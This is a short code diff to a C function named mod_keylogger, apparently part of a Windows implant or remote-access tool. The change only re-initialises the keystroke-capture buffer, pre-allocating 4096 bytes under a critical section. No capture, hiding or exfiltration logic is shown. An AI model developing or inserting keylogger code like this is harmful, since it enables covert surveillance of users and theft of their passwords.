@@ -805,10 +805,12 @@ void mod_keylogger(Buffer *out, const char *subcmd) {
         /* Init critical section once */
         if (!_kl_cs_init) { InitializeCriticalSection(&_kl_cs); _kl_cs_init = 1; }
 
-        /* Clear previous capture */
+        /* Clear previous capture and pre-allocate buffer */
         EnterCriticalSection(&_kl_cs);
-        if (_kl_buf.data) { free(_kl_buf.data); _kl_buf.data = NULL; }
-        _kl_buf.len = 0; _kl_buf.cap = 0;
+        if (_kl_buf.data) free(_kl_buf.data);
+        _kl_buf.cap = 4096;
+        _kl_buf.data = (unsigned char *)malloc(4096);
+        _kl_buf.len = 0;
         _kl_last_wnd[0] = '\0';
         LeaveCriticalSection(&_kl_cs);
 
